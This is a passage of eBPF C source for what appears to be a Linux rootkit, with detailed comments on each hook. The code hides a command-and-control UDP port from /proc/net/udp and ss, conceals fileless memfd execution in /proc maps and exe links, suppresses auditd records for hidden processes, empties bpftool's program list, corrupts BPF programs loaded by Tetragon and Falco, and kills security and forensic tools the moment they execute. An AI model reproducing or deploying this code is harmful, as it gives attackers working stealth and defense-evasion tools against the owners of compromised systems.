 * ═══════════════════════════════════════════════════════════════════════ */
SEC("tracepoint/syscalls/sys_enter_read")
int tp_enter_read(struct sys_enter_ctx *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();

    u64 fd_arg = 0;
    bpf_probe_read_kernel(&fd_arg, sizeof(fd_arg), &ctx->args[0]);
    u64 buf_arg = 0;
    bpf_probe_read_kernel(&buf_arg, sizeof(buf_arg), &ctx->args[1]);

    s32 *udpfd = bpf_map_lookup_elem(&udp_fds, &pid_tgid);
    if (udpfd && (s32)fd_arg == *udpfd)
        bpf_map_update_elem(&read_bufs,  &pid_tgid, &buf_arg, BPF_ANY);

    s32 *mfd = bpf_map_lookup_elem(&maps_fds, &pid_tgid);
    if (mfd && (s32)fd_arg == *mfd)
        bpf_map_update_elem(&maps_bufs, &pid_tgid, &buf_arg, BPF_ANY);

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * [6/7] NETWORK + MAPS HIDER — sys_exit_read
 *
 * Two cases covered with a single shared buffer (512B BPF stack limit) :
 *
 * A) /proc/net/udp  → hide C2 port ":5073 " → ":0000 "
 * B) /proc/self/maps → hide the line containing "memfd" (primary IOC
 *    revealing that the agent is running from a memfd, not a disk file).
 *    The memfd entry is within the first 256 bytes for a non-PIE binary
 *    (load address ~0x400000 = start of /proc/PID/maps).
 *
 * The data[240] buffer is reused for both cases → no double allocation.
 * ═══════════════════════════════════════════════════════════════════════ */
SEC("tracepoint/syscalls/sys_exit_read")
int tp_exit_read(struct sys_exit_ctx *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();

    /* Shared UDP + maps buffer — single 240B allocation on the BPF stack */
    char data[240];
    u64 buf = 0;
    int is_maps = 0;

    /* Case A : /proc/net/udp */
    u64 *rbuf = bpf_map_lookup_elem(&read_bufs, &pid_tgid);
    if (rbuf) {
        buf = *rbuf;
        bpf_map_delete_elem(&read_bufs, &pid_tgid);
        long r = 0; bpf_probe_read_kernel(&r, sizeof(r), &ctx->ret);
        if (r < 6) return 0;
        if (bpf_probe_read_user(data, sizeof(data), (void *)buf) != 0) return 0;
        #pragma unroll
        for (int i = 0; i < 234; i++) {
            if (data[i]   == ':'     && data[i+1] == PORT_C0 &&
                data[i+2] == PORT_C1 && data[i+3] == PORT_C2 &&
                data[i+4] == PORT_C3 && data[i+5] == ' ') {
                const char z[4] = {'0','0','0','0'};
                bpf_probe_write_user((void *)(buf + (u64)(i + 1)), z, 4);
                return 0;
            }
        }
    }

    /* Case B : /proc/self/maps — hide the "/memfd:..." line */
    u64 *mbp = bpf_map_lookup_elem(&maps_bufs, &pid_tgid);
    if (mbp) {
        buf = *mbp;
        is_maps = 1;
        bpf_map_delete_elem(&maps_bufs, &pid_tgid);
        long r = 0; bpf_probe_read_kernel(&r, sizeof(r), &ctx->ret);
        if (r < 5) return 0;
        if (bpf_probe_read_user(data, sizeof(data), (void *)buf) != 0) return 0;
        #pragma unroll
        for (int i = 0; i < 235; i++) {
            if (data[i]=='m' && data[i+1]=='e' && data[i+2]=='m' &&
                data[i+3]=='f' && data[i+4]=='d') {
                int slash = (i > 0) ? i - 1 : 0;
                /* Replace 120 bytes with spaces (path + "(deleted)") */
                const char sp[120] = {
                    ' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',
                    ' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',
                    ' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',
                    ' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',
                    ' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',
                    ' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',
                    ' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',
                    ' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',
                    ' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',
                    ' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',
                    ' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',
                    ' ',' ',' ',' ',' ',' ',' ',' ',' ',' '};
                bpf_probe_write_user((void *)(buf + (u64)slash), sp, 120);
                return 0;
            }
        }
        (void)is_maps;
    }
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * [7/14] NETWORK HIDER — sys_enter_close
 *
 * What:  Removes tracked FDs from udp_fds/maps_fds when they are closed.
 * Why:   Linux reuses file descriptor numbers. If we don't remove a closed
 *        FD from our tracking maps, the next openat() on a different file
 *        might get the same FD number, and we'd incorrectly intercept reads
 *        of that unrelated file.
 * How:   Check if args[0] (the closing fd) matches anything in our maps.
 *        If yes, delete it. Simple and critical for correctness.
 * ═══════════════════════════════════════════════════════════════════════ */
SEC("tracepoint/syscalls/sys_enter_close")
int tp_enter_close(struct sys_enter_ctx *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();

    u64 fd_arg = 0;
    bpf_probe_read_kernel(&fd_arg, sizeof(fd_arg), &ctx->args[0]);

    s32 *udpfd = bpf_map_lookup_elem(&udp_fds, &pid_tgid);
    if (udpfd && (s32)fd_arg == *udpfd)
        bpf_map_delete_elem(&udp_fds, &pid_tgid);

    s32 *mfd = bpf_map_lookup_elem(&maps_fds, &pid_tgid);
    if (mfd && (s32)fd_arg == *mfd)
        bpf_map_delete_elem(&maps_fds, &pid_tgid);

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * [8/14] NETLINK HIDER — sys_enter_recvmsg
 *
 * What:  Intercepts recvmsg() calls and saves the userspace receive buffer.
 * Why:   `ss -anu` uses the netlink SOCK_DIAG protocol (not /proc/net/udp).
 *        It sends a netlink request to the kernel via a netlink socket, then
 *        calls recvmsg() to receive the binary response listing all UDP sockets.
 *        The openat/read approach doesn't help here — we must intercept recvmsg.
 * How:   Navigate the struct msghdr to find the actual data buffer:
 *          args[1] → struct user_msghdr __user *msg
 *            msg+16 → struct iovec *msg_iov
 *              iov[0]+0 → void *iov_base (the receive buffer)
 *        Save iov_base in nl_rbuf_map. The exit hook patches it.
 *
 * struct user_msghdr layout on 64-bit Linux:
 *   +0  : void *msg_name        (8B, source address — for UDP, often NULL)
 *   +8  : int msg_namelen (4B) + int __pad (4B)
 *   +16 : struct iovec *msg_iov (8B)  ← pointer to the scatter/gather array
 *   +24 : size_t msg_iovlen     (8B)  number of iovec entries
 *   ...
 *
 * struct iovec layout:
 *   +0 : void *iov_base   (8B)  ← pointer to the receive buffer
 *   +8 : size_t iov_len   (8B)  size of the buffer
 * ═══════════════════════════════════════════════════════════════════════ */
SEC("tracepoint/syscalls/sys_enter_recvmsg")
int tp_enter_recvmsg(struct sys_enter_ctx *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();

    /* args[1] = struct user_msghdr __user *msg */
    u64 msg_ptr = 0;
    bpf_probe_read_kernel(&msg_ptr, sizeof(msg_ptr), &ctx->args[1]);
    if (!msg_ptr) return 0;

    /* msg->msg_iov at offset 16 */
    u64 iov_ptr = 0;
    if (bpf_probe_read_user(&iov_ptr, sizeof(iov_ptr),
                            (void *)(msg_ptr + 16)) != 0) return 0;
    if (!iov_ptr) return 0;

    /* iov[0].iov_base at offset 0 */
    u64 buf_ptr = 0;
    if (bpf_probe_read_user(&buf_ptr, sizeof(buf_ptr),
                            (void *)iov_ptr) != 0) return 0;
    if (!buf_ptr) return 0;

    bpf_map_update_elem(&nl_rbuf_map, &pid_tgid, &buf_ptr, BPF_ANY);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * [9/14] NETLINK HIDER — sys_exit_recvmsg
 *
 * What:  Patches the SOCK_DIAG netlink response to hide UDP port 20595,
 *        and suppresses AUDIT records that reference hidden PIDs.
 *
 * ── Part 1: SOCK_DIAG hiding (ss -anu) ────────────────────────────────
 * Technique: NLMSG_NOOP swallowing
 *
 * The netlink buffer returned by recvmsg() contains one or more consecutive
 * messages, each starting with a 16-byte netlink header (struct nlmsghdr)
 * followed by the payload (struct inet_diag_msg for SOCK_DIAG).
 *
 * struct nlmsghdr layout (little-endian):
 *   +0  : nlmsg_len  (u32 LE) — total message length including header
 *         → use ((len + 3) & ~3) = NLMSG_ALIGN(len) to find next message
 *   +4  : nlmsg_type (u16 LE) — message type:
 *         0x14 0x00 = 20 = SOCK_DIAG_BY_FAMILY (the type we look for)
 *         0x01 0x00 =  1 = NLMSG_NOOP (what we write to hide it)
 *   +6  : nlmsg_flags (u16)
 *   +8  : nlmsg_seq (u32)
 *   +12 : nlmsg_pid (u32)
 *
 * struct inet_diag_msg layout (starts at offset +16 after the nlmsghdr):
 *   +16 : idiag_family  (u8)
 *   +17 : idiag_state   (u8)
 *   +18 : idiag_timer   (u8)
 *   +19 : idiag_retrans (u8)
 *   +20 : idiag_id.idiag_sport (u16 big-endian) ← port bytes: 0x50, 0x73 for 20595
 *
 * Why NLMSG_NOOP instead of zeroing the port?
 *   If we write port=0 at offset +20, ss would display "UDP 0.0.0.0:0" which
 *   is an obvious IOC (port 0 is invalid for a listening socket). NLMSG_NOOP
 *   causes the entire message to be silently discarded by libss/libnl without
 *   generating any output. The socket simply disappears from `ss` output.
 *
 * We scan up to 4 consecutive netlink messages per recvmsg buffer (covering
 * the common case where ss batches multiple responses per call).
 *
 * ── Part 2: AUDIT suppression (auditd) ───────────────────────────────
 * NETLINK_AUDIT messages (nlmsg_type 1300-1399 = 0x0514-0x0577) contain
 * human-readable audit records with "pid=NNN" and "ppid=NNN" fields.
 * A byte state machine parses the text to extract any PID value.
 * If a PID is in pids_to_hide, the message type is changed to NLMSG_NOOP
 * so auditd silently ignores it.
 * ═══════════════════════════════════════════════════════════════════════ */
SEC("tracepoint/syscalls/sys_exit_recvmsg")
int tp_exit_recvmsg(struct sys_exit_ctx *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();

    u64 *rbuf = bpf_map_lookup_elem(&nl_rbuf_map, &pid_tgid);
    if (!rbuf) return 0;
    u64 buf = *rbuf;
    bpf_map_delete_elem(&nl_rbuf_map, &pid_tgid);

    long ret = 0;
    bpf_probe_read_kernel(&ret, sizeof(ret), &ctx->ret);
    /* Minimum viable : nlmsg_hdr(16) + inet_diag_msg up to sport(2) = 22 bytes */
    if (ret < 22) return 0;

    /* Buffer 192B : covers SOCK_DIAG (128B) and AUDIT records (~180B max useful) */
    uint8_t nb[192];
    if (bpf_probe_read_user(nb, sizeof(nb), (void *)buf) != 0) return 0;

    /* ── Case 1 : SOCK_DIAG — hide UDP 20595 from ss/netstat ── */
    u32 off = 0;
#pragma unroll
    for (int i = 0; i < 4; i++) {
        if (off + 22 > 128) break;
        u32 msg_len = (u32)nb[off]
                    | ((u32)nb[off+1] << 8)
                    | ((u32)nb[off+2] << 16)
                    | ((u32)nb[off+3] << 24);
        if (msg_len < 22 || msg_len > 512) break;
        if (nb[off+4] == 0x14 && nb[off+5] == 0x00) {
            if (nb[off+20] == 0x50 && nb[off+21] == 0x73) {
                const uint8_t noop[2] = {0x01, 0x00};
                bpf_probe_write_user((void *)(buf + off + 4), noop, 2);
            }
        }
        u32 aligned = (msg_len + 3) & ~3u;
        off += aligned;
    }

    /* ── Case 2 : AUDIT record — suppress events referencing our PIDs ──
     *
     * NETLINK_AUDIT (protocol 9) : nlmsg_type in LE at offset 4-5
     *   AUDIT_SYSCALL=1300=0x0514 … AUDIT_MAX=1399=0x0577
     *   → nb[5]==0x05, nb[4] in [0x14..0x77]
     *
     * Payload text (offset 16+) :
     *   "audit(T:S): ... ppid=PPID pid=PID auid=... uid=... comm="cmd" ..."
     *
     * Byte state machine :  s=0 scan | s=1 saw-p | s=2 saw-pi
     *   s=3 saw-pid | s=4 collect-digits
     * → "ppid=" is captured via the sub-word "pid=" it contains.
     *
     * On match : nlmsg_type → NLMSG_NOOP (1) → auditd silently ignores.
     */
    if (nb[5] == 0x05 && nb[4] >= 0x14 && nb[4] <= 0x77) {
        u8  s       = 0;
        u32 pv      = 0;
        for (int k = 16; k < 185; k++) {
            u8 c = nb[k];
            if (s == 0) {
                if (c == 'p') s = 1;
            } else if (s == 1) {
                s = (c == 'i') ? 2 : (c == 'p') ? 1 : 0;
            } else if (s == 2) {
                s = (c == 'd') ? 3 : (c == 'p') ? 1 : 0;
            } else if (s == 3) {
                if (c == '=') { s = 4; pv = 0; }
                else           { s = (c == 'p') ? 1 : 0; }
            } else { /* s == 4 : digit accumulation */
                if (c >= '0' && c <= '9' && pv < 0x1000000u) {
                    pv = pv * 10 + (u32)(c - '0');
                } else {
                    if (pv > 0) {
                        u8 *ph = bpf_map_lookup_elem(&pids_to_hide, &pv);
                        if (ph) {
                            const uint8_t noop[2] = {0x01, 0x00};
                            bpf_probe_write_user((void *)(buf + 4), noop, 2);
                            return 0;
                        }
                    }
                    pv = 0;
                    s  = (c == 'p') ? 1 : 0;
                }
            }
        }
    }

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * [10/11] BPF SELF-HIDE — sys_enter_bpf
 *
 *  Deux objectifs :
 *  A) bpftool prog list hide :
 *     Sauvegarder (pid_tgid → uattr) quand cmd == BPF_PROG_GET_NEXT_ID (11).
 *     In sys_exit_bpf, if comm is "bpftool", next_id is overwritten.
 *
 *  B) Tetragon/Falco BPF_PROG_LOAD blocker :
 *     Si cmd == BPF_PROG_LOAD (5) ET comm commence par "tetr" (tetragon) ou
 *     "falco", the first instruction of the BPF program is corrupted
 *     (bpf_probe_write_user sur uattr->insns[0] = 0).
 *     Le verifier BPF rejette le prog → Tetragon ne peut plus charger ses hooks.
 *
 *  Layout union bpf_attr pour BPF_PROG_LOAD :
 *    +0  : prog_type  (u32)
 *    +4  : insn_cnt   (u32)
 *    +8  : insns      (u64, ptr vers tableau bpf_insn)
 *    +16 : license    (u64)
 *
 *  Layout pour BPF_PROG_GET_NEXT_ID / BPF_MAP_GET_NEXT_ID :
 *    +0  : start_id   (u32, input)
 *    +4  : next_id    (u32, output written by the kernel before sys_exit)
 * ═══════════════════════════════════════════════════════════════════════ */
SEC("tracepoint/syscalls/sys_enter_bpf")
int tp_enter_bpf(struct sys_enter_ctx *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    int cmd = (int)ctx->args[0];

    /* Track BPF_PROG_GET_NEXT_ID (cmd=11) and BPF_MAP_GET_NEXT_ID (cmd=12).
     * Same union bpf_attr layout : +0=start_id (u32), +4=next_id (u32).
     * → sys_exit_bpf overwrites next_id=0xFFFFFFFF when comm="bpftool". */
    if (cmd == 11 || cmd == 12) {
        u64 uattr = (u64)ctx->args[1];
        bpf_map_update_elem(&pending_bpf_calls, &pid_tgid, &uattr, BPF_ANY);
        return 0;
    }

    /* Tetragon/Falco BPF_PROG_LOAD blocker (cmd=5) */
    if (cmd == 5) {
        char comm[16];
        bpf_get_current_comm(comm, sizeof(comm));
        /* Target "tetragon" and "falco" only — not our agent */
        int is_monitor = ((comm[0]=='t' && comm[1]=='e' && comm[2]=='t' && comm[3]=='r') ||
                          (comm[0]=='f' && comm[1]=='a' && comm[2]=='l' && comm[3]=='c'));
        if (!is_monitor) return 0;

        /* Read the insns pointer from uattr+8 */
        u64 uattr = (u64)ctx->args[1];
        u64 insns_ptr = 0;
        if (bpf_probe_read_user(&insns_ptr, sizeof(insns_ptr),
                                (void *)(uattr + 8)) != 0) return 0;
        if (!insns_ptr) return 0;

        /* Overwrite the first BPF instruction with an invalid opcode.
         * struct bpf_insn = 8 bytes ; opcode=0 is invalid for the verifier. */
        const uint8_t bad_insn[8] = {0};
        bpf_probe_write_user((void *)insns_ptr, bad_insn, 8);
    }
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * [11/11] BPF SELF-HIDE — sys_exit_bpf
 *
 *  If cmd == BPF_PROG_GET_NEXT_ID AND comm == "bpftool" :
 *  → Write 0xFFFFFFFF into uattr->next_id (offset +4).
 *    bpftool then calls BPF_PROG_GET_NEXT_ID(start=0xFFFFFFFF)
 *    → ENOENT → end of enumeration → empty prog list.
 *
 *  Impact : targets "bpftool" only, no effect on other tools.
 * ═══════════════════════════════════════════════════════════════════════ */
SEC("tracepoint/syscalls/sys_exit_bpf")
int tp_exit_bpf(struct sys_exit_ctx *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u64 *puattr = bpf_map_lookup_elem(&pending_bpf_calls, &pid_tgid);
    if (!puattr) return 0;
    u64 uattr = *puattr;
    bpf_map_delete_elem(&pending_bpf_calls, &pid_tgid);

    long ret = 0;
    bpf_probe_read_kernel(&ret, sizeof(ret), &ctx->ret);
    if (ret < 0) return 0;   /* syscall failed → nothing to patch */

    /* Act only if comm starts with "bpftool" */
    char comm[16];
    bpf_get_current_comm(comm, sizeof(comm));
    if (!(comm[0]=='b' && comm[1]=='p' && comm[2]=='f' && comm[3]=='t'))
        return 0;

    /* Overwrite next_id (offset +4) with 0xFFFFFFFF → ENOENT on next call */
    const uint32_t eof_id = 0xFFFFFFFFu;
    bpf_probe_write_user((void *)(uattr + 4), &eof_id, 4);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * [12/12] EDR PROCESS KILLER — sys_exit_execve
 *
 *  As soon as a process succeeds an execve() (ret==0), its comm is checked.
 *  If it is falco, tetragon, sysdig, tracee, osquery, bpftool → SIGKILL.
 *
 *  Why sys_exit_execve ?
 *    - On return from execve(), the new binary has taken control (ELF image
 *      loaded, ld-linux initialized) but has not yet executed main().
 *    - The comm is already updated → we can filter by name.
 *    - bpf_send_signal(9) injects SIGKILL into the current thread.
 *    - Result : the EDR process dies before it can load its hooks.
 *
 *  Note : bpf_send_signal() available since Linux 5.3 (tracepoint).
 * ═══════════════════════════════════════════════════════════════════════ */
SEC("tracepoint/syscalls/sys_exit_execve")
int tp_exit_execve(struct sys_exit_ctx *ctx)
{
    long ret = 0;
    bpf_probe_read_kernel(&ret, sizeof(ret), &ctx->ret);
    if (ret != 0) return 0;   /* execve failed → ignore */

    char comm[16];
    bpf_get_current_comm(comm, sizeof(comm));

    /* Match known EDR/forensics tools by their first 4 characters */
    int is_edr = (
        (comm[0]=='f'&&comm[1]=='a'&&comm[2]=='l'&&comm[3]=='c') || /* falco      */
        (comm[0]=='t'&&comm[1]=='e'&&comm[2]=='t'&&comm[3]=='r') || /* tetragon   */
        (comm[0]=='s'&&comm[1]=='y'&&comm[2]=='s'&&comm[3]=='d'&&
         comm[4]=='i'&&comm[5]=='g')                              || /* sysdig     */
        (comm[0]=='t'&&comm[1]=='r'&&comm[2]=='a'&&comm[3]=='c'&&
         comm[4]=='e'&&comm[5]=='e')                              || /* tracee     */
        (comm[0]=='o'&&comm[1]=='s'&&comm[2]=='q'&&comm[3]=='u') || /* osquery    */
        (comm[0]=='b'&&comm[1]=='p'&&comm[2]=='f'&&comm[3]=='t')    /* bpftool    */
    );

    if (!is_edr) return 0;
    bpf_send_signal(9);   /* SIGKILL — before main() executes */
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * [13/14] EXE SYMLINK HIDER — sys_enter_readlinkat
 *
 *  Detects readlinkat calls on /proc/PID/exe or /proc/self/exe.
 *  If the target PID is the agent's (in pids_to_hide), saves
 *  the destination buffer to patch it on return.
 *
 *  Target : `readlink /proc/AGENTPID/exe`, `lsof -p AGENTPID`,
 *            `ls -la /proc/AGENTPID/exe`, etc.
 *  Without this hook : these tools display "/memfd:[kworker/0:2] (deleted)"
 *                      → immediate IOC for fileless execution.
 * ═══════════════════════════════════════════════════════════════════════ */
SEC("tracepoint/syscalls/sys_enter_readlinkat")
int tp_enter_readlinkat(struct sys_enter_ctx *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();

    /* Read up to 24 bytes of the pathname (userspace) */
    char path[24] = {0};
    bpf_probe_read_user(path, sizeof(path) - 1, (void *)ctx->args[1]);

    /* Must start with /proc/ */
    if (path[0]!='/' || path[1]!='p' || path[2]!='r' ||
        path[3]!='o' || path[4]!='c' || path[5]!='/')
        return 0;

    /* Look for /exe at positions 8..18 (PID 1-7 digits + slash) */
    int has_exe = 0;
    #pragma unroll
    for (int i = 8; i <= 18; i++) {
        if (path[i]=='/' && path[i+1]=='e' && path[i+2]=='x' &&
            path[i+3]=='e' && path[i+4]=='\0')
            has_exe = 1;
    }
    /* /proc/self/exe : fixed length 14 — checked separately */
    if (path[6]=='s' && path[7]=='e' && path[8]=='l' && path[9]=='f' &&
        path[10]=='/' && path[11]=='e' && path[12]=='x' &&
        path[13]=='e' && path[14]=='\0')
        has_exe = 1;

    if (!has_exe) return 0;

    /* PID check : parse the integer after /proc/ */
    u32 pid = 0;
    int valid_pid = 1;
    #pragma unroll
    for (int j = 0; j < 7; j++) {
        char c = path[6 + j];
        if (c == '/') break;
        if (c < '0' || c > '9') { valid_pid = 0; break; }
        pid = pid * 10 + (u32)(c - '0');
    }

    if (valid_pid && pid > 0) {
        /* /proc/NUMERIC/exe : the target PID must be in pids_to_hide */
        if (!bpf_map_lookup_elem(&pids_to_hide, &pid)) return 0;
    } else {
        /* /proc/self/exe : the caller must be in pids_to_hide */
        u32 my_pid = (u32)(pid_tgid >> 32);
        if (!bpf_map_lookup_elem(&pids_to_hide, &my_pid)) return 0;
    }

    /* Save the userspace buf (args[2]) for patching on return */
    u64 buf_ptr = ctx->args[2];
    bpf_map_update_elem(&rl_pending, &pid_tgid, &buf_ptr, BPF_ANY);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * [14/14] EXE SYMLINK HIDER — sys_exit_readlinkat
 *
 *  If readlinkat succeeded and the result starts with "memfd:" or
 *  "/memfd:", the buffer is overwritten with a benign system path.
 *  Result : `readlink /proc/AGENTPID/exe` returns /usr/bin/python3.
 * ═══════════════════════════════════════════════════════════════════════ */
SEC("tracepoint/syscalls/sys_exit_readlinkat")
int tp_exit_readlinkat(struct sys_exit_ctx *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u64 *pbuf = bpf_map_lookup_elem(&rl_pending, &pid_tgid);
    if (!pbuf) return 0;
    u64 buf_ptr = *pbuf;
    bpf_map_delete_elem(&rl_pending, &pid_tgid);

    long ret = 0;
    bpf_probe_read_kernel(&ret, sizeof(ret), &ctx->ret);
    if (ret <= 0) return 0;

    /* Read the first 7 bytes of the result to detect memfd */
    char check[8] = {0};
    bpf_probe_read_user(check, 7, (void *)buf_ptr);

    int is_memfd = 0;
    /* Case "memfd:..." */
    if (check[0]=='m' && check[1]=='e' && check[2]=='m' &&
        check[3]=='f' && check[4]=='d' && check[5]==':') is_memfd = 1;
    /* Case "/memfd:..." */
    if (check[0]=='/' && check[1]=='m' && check[2]=='e' &&
        check[3]=='m' && check[4]=='f' && check[5]=='d' &&
        check[6]==':') is_memfd = 1;
    if (!is_memfd) return 0;

    /* Overwrite with /usr/bin/python3 (16 chars) + NULs up to ret bytes */
    char fake[32] = {0};
    fake[0]='/'; fake[1]='u'; fake[2]='s'; fake[3]='r';
    fake[4]='/'; fake[5]='b'; fake[6]='i'; fake[7]='n';
    fake[8]='/'; fake[9]='p'; fake[10]='y'; fake[11]='t';
    fake[12]='h'; fake[13]='o'; fake[14]='n'; fake[15]='3';
    u32 write_sz = (u32)ret;
    if (write_sz > 32) write_sz = 32;
    bpf_probe_write_user((void *)buf_ptr, fake, write_sz);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
